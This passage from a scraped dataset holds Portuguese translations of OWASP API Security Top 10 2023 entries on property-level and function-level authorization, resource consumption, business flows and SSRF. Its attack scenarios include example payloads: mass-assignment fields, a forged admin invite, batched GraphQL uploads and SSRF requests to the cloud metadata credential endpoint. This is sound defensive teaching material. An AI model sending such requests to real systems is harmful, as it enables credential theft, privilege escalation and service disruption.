https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html\n[2]: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/03-Testing_for_Weak_Lock_Out_Mechanism(OTG-AUTHN-003)\n[3]: https://cloud.google.com/endpoints/docs/openapi/when-why-api-key\n[4]: https://cheatsheetseries.owasp.org/cheatsheets/Key_Management_Cheat_Sheet.html\n[5]: https://owasp.org/www-community/attacks/Credential_stuffing\n[6]: https://cwe.mitre.org/data/definitions/204.html\n[7]: https://cwe.mitre.org/data/definitions/307.html\n", "timestamp": "2025-10-24T22:27:02.902092"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/pt-pt/0xa3-broken-object-property-level-authorization.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/pt-pt/0xa3-broken-object-property-level-authorization.md", "content": "# API3:2023 Broken Object Property Level Authorization\n\n| Agentes Ameaça/Vetores Ataque | Falha Segurança | Impactos |\n| - | - | - |\n| Específico da API : Abuso **Fácil** | Prevalência **Comum** : Deteção **Fácil** | Técnico **Moderado** : Específico Negócio |\n| As APIs tendem a expor _endpoints_ que devolvem todas as propriedades do objeto. Isto é especialmente válido para APIs REST. Para outros protocolos como o GraphQL, pode ser necessário enviar pedidos elaborados para especificar que propriedades devem ser devolvidas. Identificar estas propriedades adicionais que podem ser manipuladas requer mais esforço, mas existem algumas ferramentas automatizadas disponíveis para ajudar nesta tarefa. | Inspecionar as respostas da API é suficiente para identificar informações sensíveis nas representações dos objetos devolvidos. _Fuzzing_ é geralmente usado para identificar propriedades adicionais (ocultas). Determinar se podem ser alteradas depende da elaboração de um pedido à API e da análise da resposta. Pode ser necessária uma análise de efeitos secundários se a propriedade alvo não for devolvida na resposta da API. | O acesso não autorizado a propriedades privadas/sensíveis de objetos pode resultar na divulgação de dados, perda de dados ou corrupção de dados. Em certas circunstâncias, o acesso não autorizado a propriedades de objetos pode levar a elevação de privilégios ou a apropriação parcial/completa de conta. |\n\n## A API é vulnerável?\n\nAo permitir que um utilizador aceda a um objeto através de um _endpoint_ da API, \né importante validar que o utilizador tem acesso às propriedades específicas do \nobjeto que está a tentar aceder.\n\nUm _endpoint_ de uma API é vulnerável se:\n\n* O _endpoint_ da API expõe propriedades de um objeto que são consideradas\n  sensíveis e não devem ser lidas pelo utilizador. (anteriormente denominado:\n  \"[Excessive Data Exposure][1]\")\n* O _endpoint_ da API permite que um utilizador altere, adicione ou elimine o\n  valor de uma propriedade sensível de um objeto ao qual o utilizador não deve\n  ter acesso. (anteriormente denominado: \"[Mass Assignment][2]\")\n\n## Exemplos de Cenários de Ataque\n\n### Cenário #1\n\nUma aplicação de encontros permite a um utilizador denunciar outros utilizadores\npor comportamento inadequado. Como parte deste processo, o utilizador clica num \nbotão de 'denúncia', e é desencadeada a seguinte chamada de API:\n\n```\nPOST /graphql\n{\n  \"operationName\":\"reportUser\",\n  \"variables\":{\n    \"userId\": 313,\n    \"reason\":[\"offensive behavior\"]\n  },\n  \"query\":\"mutation reportUser($userId: ID!, $reason: String!) {\n    reportUser(userId: $userId, reason: $reason) {\n      status\n      message\n      reportedUser {\n        id\n        fullName\n        recentLocation\n      }\n    }\n  }\"\n}\n```\n\nO endpoint da API é vulnerável porque permite que o utilizador autenticado tenha \nacesso a propriedades sensíveis do utilizador denunciado, como \"fullName\" (nome \ncompleto) e \"recentLocation\" (localização recente), que não deveriam estar \nacessíveis a outros utilizadores.\n\n### Cenário #2\n\nUma plataforma de mercado online, que permite a um tipo de utilizadores \n('anfitriões') alugar o seu apartamento a outro tipo de utilizadores \n('hóspedes'), requer que o anfitrião aceite uma reserva feita por um hóspede \nantes de cobrar ao hóspede pela estadia.\n\nComo parte deste processo, é feito um pedido de API pelo anfitrião para\n`POST /api/host/approve_booking` com o seguinte conteúdo legítimo:\n\n```\n{\n  \"approved\": true,\n  \"comment\": \"Check-in is after 3pm\"\n}\n```\n\nO anfitrião reenvia o pedido legítimo e adiciona o seguinte conteúdo malicioso:\n\n```\n{\n  \"approved\": true,\n  \"comment\": \"Check-in is after 3pm\",\n  \"total_stay_price\": \"$1,000,000\"\n}\n```\n\nO _endpoint_ da API é vulnerável porque não há validação de que o anfitrião \ndeve ter acesso à propriedade interna do objeto - `total_stay_price`, e o \nhóspede vai ser cobrado mais do que deveria.\n\n### Cenário #3\n\nUma rede social baseada em vídeos curtos, impõe filtros restritivos de conteúdo \ne censura. Mesmo que um vídeo carregado seja bloqueado, o utilizador pode \nalterar a descrição do vídeo utilizando o seguinte pedido à API:\n\n```\nPUT /api/video/update_video\n\n{\n  \"description\": \"a funny video about cats\"\n}\n```\n\nUm utilizador frustrado pode reenviar o pedido legítimo e adicionar o seguinte \nconteúdo malicioso:\n\n```\n{\n  \"description\": \"a funny video about cats\",\n  \"blocked\": false\n}\n```\n\nO _endpoint_ da API é vulnerável porque não há validação se o utilizador deve \nter acesso à propriedade interna do objeto - `blocked`, e o utilizador pode \nalterar o valor de `true` para `false` e desbloquear o seu próprio conteúdo \nbloqueado.\n\n## Como Prevenir\n\n* Ao expor um objeto através de um _endpoint_ da API, certifique-se sempre de \n  que o utilizador deve ter acesso às propriedades do objeto que expõe.\n* Evite usar métodos genéricos como `to_json()` e `to_string()`. Em vez disso,\n  selecione especificamente as propriedades do objeto que deseja retornar.\n* Se possível, evite usar funções que automaticamente vinculem os dados\n  provenientes do cliente em variáveis de código, objetos internos ou\n  propriedades de objetos (\"Mass Assignment\").\n* Permita alterações apenas nas propriedades do objeto que devam ser\n  atualizadas pelo cliente.\n* Implemente um mecanismo de validação de resposta baseado num esquema como uma \n  camada extra de segurança. Como parte deste mecanismo, defina e imponha que \n  dados são retornados por todos os métodos da API.\n* Mantenha as estruturas de dados retornadas ao mínimo essencial, de acordo com \n  os requisitos comerciais/funcionais para o _endpoint_.\n\n## Referências\n\n### OWASP\n\n* [API3:2019 Excessive Data Exposure - OWASP API Security Top 10 2019][1]\n* [API6:2019 - Mass Assignment - OWASP API Security Top 10 2019][2]\n* [Mass Assignment Cheat Sheet][3]\n\n### Externas\n\n* [CWE-213: Exposure of Sensitive Information Due to Incompatible Policies][4]\n* [CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes][5]\n\n[1]: https://owasp.org/API-Security/editions/2019/en/0xa3-excessive-data-exposure/\n[2]: https://owasp.org/API-Security/editions/2019/en/0xa6-mass-assignment/\n[3]: https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html\n[4]: https://cwe.mitre.org/data/definitions/213.html\n[5]: https://cwe.mitre.org/data/definitions/915.html\n", "timestamp": "2025-10-24T22:27:03.007500"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/pt-pt/0xa4-unrestricted-resource-consumption.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/pt-pt/0xa4-unrestricted-resource-consumption.md", "content": "# API4:2023 Unrestricted Resource Consumption\n\n| Agentes Ameaça/Vetores Ataque | Falha Segurança | Impactos |\n| - | - | - |\n| Específico da API : Abuso **Moderado** | Prevalência **Predominante** : Deteção **Fácil** | Técnico **Grave** : Específico Negócio |\n| A exploração requer pedidos simples de API. Múltiplos pedidos concorrentes podem ser feitos a partir de um único computador local ou utilizando recursos de computação em nuvem. A maioria das ferramentas automatizadas disponíveis são projetadas para causar DoS (Negação de Serviço) através de altas cargas de tráfego, afetando a taxa de serviço das APIs. | É comum encontrar APIs que não limitam as interações do cliente ou o consumo de recursos. Pedidos de API elaborados, como aqueles que incluem parâmetros que controlam o número de recursos a serem retornados e realizam análises de estado/tempo/comprimento de resposta, devem permitir a identificação do problema. O mesmo vale para operações em quantidade. Embora os agentes maliciosos não tenham visibilidade sobre o impacto nos custos, isso pode ser inferido com base no modelo de negócios/preços dos fornecedores de serviços (e.g. fornecedor de nuvem). | A exploração pode levar a uma Negação de Serviço (DoS) devido à escassez de recursos, mas também pode resultar num aumento dos custos operacionais, como os relacionados à infraestrutura devido à maior exigência de CPU, aumento das necessidades de armazenamento em nuvem, etc. |\n\n## A API é vulnerável?\n\nPara atender aos pedidos feitos à API, são necessários recursos como largura de \nbanda de rede, CPU, memória e armazenamento. Às vezes, os recursos necessários \nsão disponibilizados por provedores de serviços por meio de integrações de API \ne são pagos por pedido, como o envio de emails/SMS/chamadas telefónicas, \nvalidação biométrica, etc.\n\nUma API é vulnerável se pelo menos um dos seguintes limites estiver ausente ou \ndefinido inadequadamente (e.g. muito baixo/alto):\n\n* Tempos limite de execução\n* Memória máxima alocável\n* Número máximo de descritores de ficheiro\n* Número máximo de processos\n* Tamanho máximo de upload de ficheiro\n* Número de operações a serem realizadas num único pedido do cliente da API\n  (e.g. agrupamento GraphQL)\n* Número de registros por página a serem retornados num único pedido-resposta\n* Limite de gastos de provedores de serviços terceiros\n\n## Exemplos de Cenários de Ataque\n\n### Cenário #1\n\nUma rede social implementou um mecanismo de \"recuperar senha\" através da \nverificação por SMS, permitindo que o utilizador receba um _token_ de uso único \nvia SMS para redefinir a sua senha.\n\nUma vez que o utilizador clica em \"recuperar senha\", é feita uma chamada API a \npartir do navegador do utilizador para a API de _back-end_:\n\n```\nPOST /initiate_forgot_password\n\n{\n  \"step\": 1,\n  \"user_number\": \"6501113434\"\n}\n```\n\nEm seguida, nos bastidores, é feita uma chamada API do _back-end_ para uma API \nde terceiros que se encarrega da entrega do SMS:\n\n```\nPOST /sms/send_reset_pass_code\n\nHost: willyo.net\n\n{\n  \"phone_number\": \"6501113434\"\n}\n```\n\nO fornecedor de terceiros, Willyo, cobra $0.05 por este tipo de chamada.\n\nUm atacante escreve código que envia a primeira chamada API dezenas de milhares \nde vezes. O _back-end_ prossegue e solicita à Willyo que envie dezenas de \nmilhares de mensagens de texto, levando a empresa a perder milhares de dólares \nem questão de minutos.\n\n### Cenário #2\n\nUm _endpoint_ de API GraphQL permite que o utilizador carregue uma foto de \nperfil.\n\n```\nPOST /graphql\n\n{\n  \"query\": \"mutation {\n    uploadPic(name: \\\"pic1\\\", base64_pic: \\\"R0FOIEFOR0xJVA…\\\") {\n      url\n    }\n  }\"\n}\n```\n\nUma vez concluído o carregamento, a API gera múltiplas miniaturas com diferentes \ntamanhos com base na imagem carregada. Esta operação gráfica consome muita \nmemória do servidor.\n\nA API implementa uma proteção tradicional de limitação de quantidade de pedidos \n- um utilizador não pode aceder ao _endpoint_ GraphQL demasiadas vezes num curto\nperíodo de tempo. A API também verifica o tamanho da imagem carregada antes de\ngerar as miniaturas para evitar o processamento de imagens demasiado grandes.\n\nUm atacante pode facilmente contornar esses mecanismos, aproveitando a natureza \nflexível do GraphQL:\n\n```\nPOST /graphql\n\n[\n  {\"query\": \"mutation {uploadPic(name: \\\"pic1\\\", base64_pic: \\\"R0FOIEFOR0xJVA…\\\") {url}}\"},\n  {\"query\": \"mutation {uploadPic(name: \\\"pic2\\\", base64_pic: \\\"R0FOIEFOR0xJVA…\\\") {url}}\"},\n  ...\n  {\"query\": \"mutation {uploadPic(name: \\\"pic999\\\", base64_pic: \\\"R0FOIEFOR0xJVA…\\\") {url}}\"},\n}\n```\n\nComo a API não limita o número de vezes que a operação `uploadPic` pode ser \ntentada, a chamada levará ao esgotamento da memória do servidor e à negação de \nserviço (_Denial of Service_).\n\n### Cenário #3\n\nUm prestador de serviços permite que os clientes descarreguem ficheiros \narbitrariamente grandes através da sua API. Estes ficheiros são mantidos em \narmazenamento de objetos na nuvem e não mudam com frequência. O prestador de \nserviços depende de um serviço de _cache_ para melhorar a velocidade do serviço \ne manter o consumo de largura de banda baixo. O serviço de _cache_ apenas \narmazena ficheiros até 15GB.\n\nQuando um dos ficheiros é atualizado, o seu tamanho aumenta para 18GB. Todos os \nclientes do serviço começam imediatamente a descarregar a nova versão. Como não \nhavia alertas de custo de consumo, nem um limite máximo de custo para o serviço \nde nuvem, a fatura mensal seguinte aumenta de 13 dólares, em média, para 8 mil \ndólares.\n\n## Como Prevenir\n\n* Utilize uma solução que facilite a limitação de [memória][1], [CPU][2],\n  [número de reinícios][3], [descritores de ficheiros e processos][4], como\n  Containers / Código Serverless (e.g. Lambdas).\n* Defina e force um tamanho máximo de dados em todos os parâmetros e conteúdos\n  de entrada, como comprimento máximo para _strings_,  número máximo de \n  elementos em arrays e tamanho máximo de ficheiro para _upload_ \n  (independentemente de ser armazenado localmente ou na nuvem).\n* Implemente um limite de frequência com que um cliente pode interagir com a API\n  dentro de um período temporal definido (_rate limiting_).\n* A limitação de pedidos deve ser ajustada com base nas necessidades do negócio.\n  Alguns endpoints da API podem exigir políticas mais rigorosas.\n* Limite/controle quantas vezes ou com que frequência um único \n  cliente/utilizador da API pode executar uma única operação (e.g. validar um \n  OTP ou solicitar a recuperação de senha sem visitar o URL de uso único).\n* Adicione validação adequada no lado do servidor para parâmetros da \n  _query string_ e do corpo do pedido, especificamente aqueles que controlam o \n  número de resultados a serem retornados na resposta.\n* Configure limites de gastos para todos os fornecedores de serviços/integrações \n  de API. Quando não for possível definir limites de gastos, devem ser \n  configurados alertas de faturamento.\n\n## Referências\n\n### OWASP\n\n* [\"Availability\" - Web Service Security Cheat Sheet][5]\n* [\"DoS Prevention\" - GraphQL Cheat Sheet][6]\n* [\"Mitigating Batching Attacks\" - GraphQL Cheat Sheet][7]\n\n### Externas\n\n* [CWE-770: Allocation of Resources Without Limits or Throttling][8]\n* [CWE-400: Uncontrolled Resource Consumption][9]\n* [CWE-799: Improper Control of Interaction Frequency][10]\n* \"Rate Limiting (Throttling)\" - [Security Strategies for Microservices-based\n  Application Systems][11], NIST\n\n[1]: https://docs.docker.com/config/containers/resource_constraints/#memory\n[2]: https://docs.docker.com/config/containers/resource_constraints/#cpu\n[3]: https://docs.docker.com/engine/reference/commandline/run/#restart\n[4]: https://docs.docker.com/engine/reference/commandline/run/#ulimit\n[5]: https://cheatsheetseries.owasp.org/cheatsheets/Web_Service_Security_Cheat_Sheet.html#availability\n[6]: https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html#dos-prevention\n[7]: https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html#mitigating-batching-attacks\n[8]: https://cwe.mitre.org/data/definitions/770.html\n[9]: https://cwe.mitre.org/data/definitions/400.html\n[10]: https://cwe.mitre.org/data/definitions/799.html\n[11]: https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-204.pdf\n", "timestamp": "2025-10-24T22:27:03.119425"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/pt-pt/0xa5-broken-function-level-authorization.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/pt-pt/0xa5-broken-function-level-authorization.md", "content": "# API5:2023 Broken Function Level Authorization\n\n| Agentes Ameaça/Vetores Ataque | Falha Segurança | Impactos |\n| - | - | - |\n| Específico da API : Abuso **Fácil** | Prevalência **Comum** : Deteção **Fácil** | Técnico **Grave** : Específico Negócio |\n| Para abusar deste tipo de falha o atacante tem de realizar pedidos legítimos ao _endpoint_ da API ao qual não é suposto ter acesso como utilizadores anónimos, ordinários ou não privilegiados. _Endpoints_ expostos serão facilmente explorados. | As verificações de autorização para aceder a uma determinada função ou recurso são normalmente geridas por configuração ou ao nível da implementação. A correta implementação destes mecanismos pode tornar-se confusa, uma vez que, as aplicações modernas prevêem vários perfis ou grupos de utilizador, assim como complexos esquemas de hierarquias (e.g. sub-utilizadores, utilizadores com mais do que um perfil). É mais fácil descobrir estas falhas em APIs dado que APIs são mais estruturadas, e aceder a diferentes funções é mais previsível. | Estas falhas permitem aos atacantes aceder de forma não autorizada a certas funcionalidades. As funcionalidades administrativas são o alvo preferencial neste tipo de ataqueo que pode levar a divulgação de dados, perda de dados, ou corrupção de dados. Por último, pode dar aso a uma disrupção de serviço. |\n\n## A API é vulnerável?\n\nA melhor forma de identificar falhas de verificação de autorização de acesso a\nfunções é através duma análise detalhada do mecanismo de autorização, devendo\nter-se em consideração o esquema de hierarquia de utilizadores, diferentes\nperfis ou grupos e questionando continuamente:\n\n* Utilizadores ordinários podem aceder aos _endpoints_ de administração?\n* Os utilizadores podem realizar ações sensíveis (e.g. criar, modificar ou\n  apagar) para as quais não deveriam ter acesso, alterando simplesmente o método\n  HTTP (e.g. alterando de `GET` para `DELETE`)?\n* Um utilizador do grupo X pode aceder a uma função reservada ao grupo Y,\n  adivinhando o URL do _endpoint_ e os parâmetros (e.g.\n  `/api/v1/users/export_all`)?\n\nNunca assuma o tipo dum _endpoint_, normal ou administrativo, apenas com base no\nURL.\n\nApesar dos programadores poderem ter decidido expor a maioria dos _endpoints_\nadministrativos sob um mesmo prefixo, e.g. `api/admins`, é comum encontrarem-se\n_endpoints_ administrativos sob outros prefixos, misturados com _endpoints_\nordinários e.g. `api/users`.\n\n## Exemplos de Cenários de Ataque\n\n### Cenário #1\n\nDurante o processo de registo para uma aplicação que permite apenas a adesão \nde utilizadores convidados, a aplicação móvel faz uma chamada de API para \n`GET /api/invites/{invite_guid}`. A resposta contém um JSON com detalhes sobre \no convite, incluindo o perfil do utilizador e o email do utilizador.\n\nUm atacante duplica o pedido e manipula o método HTTP e o _endpoint_ para \n`POST /api/invites/new`. Este _endpoint_ deveria ser usado apenas por \nadministradores através da consola de administração. O _endpoint_ não implementa \nverificações de autorização de acesso à função.\n\nO atacante explora a falha e envia um novo convite com privilégios de \nadministrador:\n\n```\nPOST /api/invites/new\n\n{\n  \"email\": \"attacker@somehost.com\",\n  \"role\":\"admin\"\n}\n```\n\nMais tarde, o atacante usa o convite criado maliciosamente para criar uma conta \nde administrador e obter acesso total ao sistema.\n\n### Cenário #2\n\nUma API contém um _endpoint_ que deveria ser exposto apenas a administradores - \n`GET /api/admin/v1/users/all`. Este _endpoint_ retorna os detalhes de todos os \nutilizadores da aplicação e não implementa verificações de autorização de acesso \nà função. Um atacante que aprendeu sobre a estrutura da API faz uma suposição \ninformada e consegue aceder a este _endpoint_, expondo detalhes sensíveis dos \nutilizadores da aplicação.\n\n## Como Prevenir\n\nA sua API deve usar um módulo de autorização consistente e fácil de analisar, o\nqual deve ser invocado por todas as funções de negócio. Frequentemente, este\ntipo de proteção é oferecido por um ou mais componentes externos à lógica\naplicacional.\n\n* Por omissão todos os acesso devem ser negados, exigindo que permissões\n  específicas sejam concedidas a perfis específicos para acesso a cada função.\n* Rever todos os _endpoints_ à procura de falhas ao nível da verificação de\n  autorização de acesso a funções, tendo sempre em consideração a lógica de\n  negócio da aplicação e hierarquia dos grupos.\n* Assegurar que todos os controladores administrativos herdam de um controlador\n  administrativo base que implementa as verificações de autorização com base no\n  grupo/perfil do utilizador.\n* Assegurar que funções administrativas num controlador ordinário implementam\n  elas próprias as verificações de autorização baseadas no grupo e perfil do\n  utilizador.\n\n## Referências\n\n### OWASP\n\n* [Forced Browsing][1]\n* \"A7: Missing Function Level Access Control\", [OWASP Top 10 2013][2]\n* [Access Control][3]\n\n### Externas\n\n* [CWE-285: Improper Authorization][4]\n\n[1]: https://owasp.org/www-community/attacks/Forced_browsing\n[2]: https://github.com/OWASP/Top10/raw/master/2013/OWASP%20Top%2010%20-%202013.pdf\n[3]: https://owasp.org/www-community/Access_Control\n[4]: https://cwe.mitre.org/data/definitions/285.html\n", "timestamp": "2025-10-24T22:27:03.325285"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/pt-pt/0xa6-unrestricted-access-to-sensitive-business-flows.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/pt-pt/0xa6-unrestricted-access-to-sensitive-business-flows.md", "content": "# API6:2023 Unrestricted Access to Sensitive Business Flows\n\n| Agentes Ameaça/Vetores Ataque | Falha Segurança | Impactos |\n| - | - | - |\n| Específico da API : Abuso **Fácil** | Prevalência **Predominante** : Deteção **Moderado** | Técnico **Moderado** : Específico Negócio |\n| A exploração geralmente envolve entender o modelo de negócio suportado pela API, encontrar fluxos de negócio sensíveis e automatizar o acesso a esses fluxos, causando danos ao negócio. | A falta de uma visão holística da API para suportar plenamente os requisitos de negócio tende a contribuir para a prevalência deste problema. Os atacantes identificam manualmente quais recursos (e.g. _endpoints_) estão envolvidos no fluxo de trabalho alvo e como funcionam em conjunto. Se já existirem mecanismos de mitigação, os atacantes precisam encontrar uma maneira de os contornar. | Em geral, não se espera um impacto técnico significativo. A exploração pode prejudicar o negócio de diferentes maneiras, por exemplo: impedir que utilizadores legítimos comprem um produto ou levar a uma inflação na economia interna de um jogo. |\n\n## A API é vulnerável?\n\nAo criar um _endpoint_ de API, é importante entender qual fluxo de negócio ele \nexpõe. Alguns fluxos de negócio são mais sensíveis do que outros, no sentido de \nque o acesso excessivo a eles pode prejudicar o negócio.\n\nExemplos comuns de fluxos de negócios sensíveis e o risco de acesso excessivo \nassociado a eles:\n\n* Fluxo de compra de um produto - um atacante pode comprar todo o stock de um\n  item de alta procura de uma só vez e revendê-lo por um preço mais alto \n  (scalping).\n* Fluxo de criação de comentário/publicação - um atacante pode inundar o sistema \n  com spam.\n* Realização de uma reserva - um atacante pode reservar todos os horários \n* disponíveis e impedir que outros utilizadores utilizem o sistema.\n\nO risco de acesso excessivo pode variar entre indústrias e empresas. Por \nexemplo, a criação de publicações através de um script pode ser considerada um \nrisco de spam por uma rede social, mas incentivada por outra rede social.\n\nUm endpoint de API está vulnerável se expõe um fluxo de negócio sensível sem \nrestringir adequadamente o acesso a ele.\n\n## Exemplos de Cenários de Ataque\n\n### Cenário #1\n\nUma empresa de tecnologia anuncia que vai lançar uma nova consola de jogos no \nDia de Ação de Graças. O produto tem uma procura muito alta e o stock é \nlimitado. Um atacante escreve código para comprar automaticamente o novo produto \ne concluir a transação.\n\nNo dia do lançamento, o atacante executa o código distribuído por diferentes \nendereços IP e localizações. A API não implementa a proteção adequada e permite \nque o atacante compre a maior parte do stock antes de outros utilizadores \nlegítimos.\n\nMais tarde, o atacante vende o produto noutra plataforma por um preço muito mais \nalto.\n\n### Cenário #2\n\nUma companhia aérea oferece a compra de bilhetes online sem taxa de \ncancelamento. Um utilizador com intenções maliciosas reserva 90% dos assentos de \num voo desejado.\n\nAlguns dias antes do voo, o utilizador malicioso cancelou todos os bilhetes de \numa vez, o que obrigou a companhia aérea a baixar os preços dos bilhetes para \npreencher o voo.\n\nDeste modo, o utilizador consegue comprar um bilhete que está muito mais barato \ndo que o original.\n\n### Cenário #3\n\nUma aplicação de partilha de boleias oferece um programa de referência - os \nutilizadores podem convidar os seus amigos e ganhar crédito por cada amigo que \nse juntar à aplicação. Este crédito pode ser posteriormente utilizado como \ndinheiro para reservar viagens.\n\nUm atacante explora este fluxo escrevendo um script para automatizar o processo \nde registo, com cada novo utilizador a adicionar crédito à carteira do atacante.\n\nO atacante pode posteriormente usufruir de viagens gratuitas ou vender as contas \ncom créditos excessivos por dinheiro.\n\n## Como Prevenir\n\nO planeamento da mitigação deve ser feito em duas camadas:\n\n* Negócio - identificar os fluxos de negócio que podem prejudicar a empresa se\n  forem utilizados em excesso.\n* Engenharia - escolher os mecanismos de proteção adequados para mitigar o risco\n  empresarial.\n\n    Alguns dos mecanismos de proteção são mais simples, enquanto outros são mais\n    difíceis de implementar. Os seguintes métodos são utilizados para desacelerar\n    ameaças automatizadas:\n\n    * _Fingerprinting_ de dispositivos: negar serviço a dispositivos de cliente\n      inesperados (e.g. navegadores _headless_) tende a fazer com que os atacantes\n      usem soluções mais sofisticadas, tornando-as mais caras para eles.\n    * Deteção humana: utilize _captcha_ ou soluções biométricas mais avançadas\n      (e.g. padrões de digitação).\n    * Padrões não humanos: analisar o fluxo do utilizador para detetar padrões\n      não humanos (e.g. o utilizador acedeu às funções \"adicionar ao carrinho\" e\n      \"finalizar compra\" em menos de um segundo).\n    * Considere bloquear endereços IP de nós de saída da rede Tor e proxies bem\n      conhecidos.\n\n    Proteja e limite o acesso às APIs que são consumidas diretamente por máquinas\n    (como APIs para desenvolvedores e B2B). Elas tendem a ser um alvo fácil para\n    atacantes, pois muitas vezes não implementam todos os mecanismos de proteção\n    necessários.\n\n## Referências\n\n### OWASP\n\n* [OWASP Automated Threats to Web Applications][1]\n* [API10:2019 Insufficient Logging & Monitoring][2]\n\n[1]: https://owasp.org/www-project-automated-threats-to-web-applications/\n[2]: https://owasp.org/API-Security/editions/2019/en/0xaa-insufficient-logging-monitoring/\n\n", "timestamp": "2025-10-24T22:27:03.444208"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/pt-pt/0xa7-server-side-request-forgery.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/pt-pt/0xa7-server-side-request-forgery.md", "content": "# API7:2023 Server Side Request Forgery\n\n| Agentes Ameaça/Vetores Ataque | Falha Segurança | Impactos |\n| - | - | - |\n| Específico da API : Abuso **Fácil** | Prevalência **Comum** : Detectability **Fácil** | Técnico **Moderado** : Específico do Negócio |\n| A exploração requer que o atacante encontre um _endpoint_ da API que aceda a um URI fornecido pelo cliente. Em geral, SSRF básico (quando a resposta é retornada ao atacante) é mais fácil de explorar do que _Blind_ SSRF, em que o atacante não tem feedback sobre se o ataque foi bem sucedido ou não. | Os conceitos modernos no desenvolvimento de aplicações incentivam os desenvolvedores a aceder a URIs fornecidos pelo cliente. A falta de validação ou a validação inadequada desses URIs são problemas comuns. Será necessária a análise regular de solicitações e respostas da API para detetar o problema. Quando a resposta não é retornada (_Blind_ SSRF), a deteção da vulnerabilidade exige mais esforço e criatividade. | A exploração bem sucedida pode levar à enumeração de serviços internos (e.g. scan de portas), divulgação de informações, bypass de firewalls ou outros mecanismos de segurança. Em alguns casos, pode levar a DoS ou ao uso do servidor como um proxy para ocultar atividades maliciosas. |\n\n## A API é vulnerável?\n\nFalhas de Server-Side Request Forgery (SSRF) ocorrem quando uma API pede um \nrecurso remoto sem validar o URL fornecido pelo utilizador. Isso permite que um \natacante force a aplicação a enviar um pedido manipulado para um destino \ninesperado, mesmo quando protegido por uma firewall ou uma VPN.\n\nOs conceitos modernos no desenvolvimento de aplicações tornam o SSRF mais comum \ne mais perigoso.\n\nMais comum - os seguintes conceitos incentivam os desenvolvedores a aceder a \nrecursos externos com base em entradas de utilizadores: Webhooks, download de \nficheiros a partir de URLs, SSO personalizado e pré-visualização de URLs.\n\nMais perigoso - Tecnologias modernas como provedores de nuvem, Kubernetes e \nDocker expõem canais de gestão e controle via HTTP em caminhos previsíveis e \nbem conhecidos. Esses canais são um alvo fácil para um ataque SSRF.\n\nTambém é mais desafiador limitar o tráfego de saída da sua aplicação, devido à \nnatureza conectada das aplicações modernas.\n\nO risco de SSRF nem sempre pode ser completamente eliminado. Ao escolher um \nmecanismo de proteção, é importante considerar os riscos e necessidades do \nnegócio.\n\n## Exemplos de Cenários de Ataque\n\n### Cenário #1\n\nUma rede social permite que os utilizadores façam o upload de fotos de perfil. \nO utilizador pode escolher entre carregar o ficheiro de imagem do seu \ndispositivo ou fornecer o URL da imagem. Escolher a segunda opção irá acionar a \nseguinte chamada API:\n\n```\nPOST /api/profile/upload_picture\n\n{\n  \"picture_url\": \"http://example.com/profile_pic.jpg\"\n}\n```\n\nUm atacante pode enviar um URL malicioso e iniciar um _scan_ de portas \ndentro da rede interna usando o _endpoint_ da API.\n\n```\n{\n  \"picture_url\": \"localhost:8080\"\n}\n```\n\nCom base no tempo de resposta, o atacante pode descobrir se a porta está \naberta ou não.\n\n### Cenário #2\n\nUm produto de segurança gera eventos quando detecta anomalias na rede. \nAlgumas equipas preferem rever os eventos num sistema de monitorização mais \namplo e genérico, como um SIEM (Gestão de Informações e Eventos de Segurança). \nPara este fim, o produto fornece integração com outros sistemas usando \n_webhooks_.\n\nComo parte da criação de um novo _webhook_, uma mutação GraphQL é enviada com o\nURL da API do SIEM.\n\n```\nPOST /graphql\n\n[\n  {\n    \"variables\": {},\n    \"query\": \"mutation {\n      createNotificationChannel(input: {\n        channelName: \\\"ch_piney\\\",\n        notificationChannelConfig: {\n          customWebhookChannelConfigs: [\n            {\n              url: \\\"http://www.siem-system.com/create_new_event\\\",\n              send_test_req: true\n            }\n          ]\n    \t  }\n  \t  }){\n    \tchannelId\n  \t}\n\t}\"\n  }\n]\n\n```\n\nDurante o processo de criação, o _back-end_ da API envia um pedido de teste para o\nURL do webhook fornecido e apresenta a resposta ao utilizador. \n\nUm atacante pode explorar este fluxo e fazer com que a API solicite um recurso \nsensível, como um serviço de metadados de nuvem interna que expõe credenciais:\n\n```\nPOST /graphql\n\n[\n  {\n    \"variables\": {},\n    \"query\": \"mutation {\n      createNotificationChannel(input: {\n        channelName: \\\"ch_piney\\\",\n        notificationChannelConfig: {\n          customWebhookChannelConfigs: [\n            {\n              url: \\\"http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-default-ssm\\\",\n              send_test_req: true\n            }\n          ]\n        }\n      }) {\n        channelId\n      }\n    }\n  }\n]\n```\n\nUma vez que a aplicação mostra a resposta do pedido de teste, o atacante pode \nvisualizar as credenciais do ambiente de nuvem.\n\n## Como Prevenir\n\n* Isole o mecanismo de obtenção de recursos na sua rede: geralmente, essas\n  funcionalidades são destinadas a recuperar recursos remotos e não internos.\n* Sempre que possível, utilize listas de permissões de:\n    * Origens remotas das quais se espera que os utilizadores façam download de\n      recursos (por exemplo, Google Drive, Gravatar, etc.)\n    * Esquemas de URL e portas\n    * Tipos de media aceites para uma determinada funcionalidade\n* Desative redirecionamentos HTTP.\n* Utilize um URL _parser_ bem testado e mantido para evitar problemas causados\npor inconsistências no processamento de URLs.\n* Valide e sanitize todos os dados de entrada fornecidos pelo cliente.\n* Não envie respostas não tratadas aos clientes.\n\n## Referências\n\n### OWASP\n\n* [Server Side Request Forgery][1]\n* [Server-Side Request Forgery Prevention Cheat Sheet][2]\n\n### Externas\n\n* 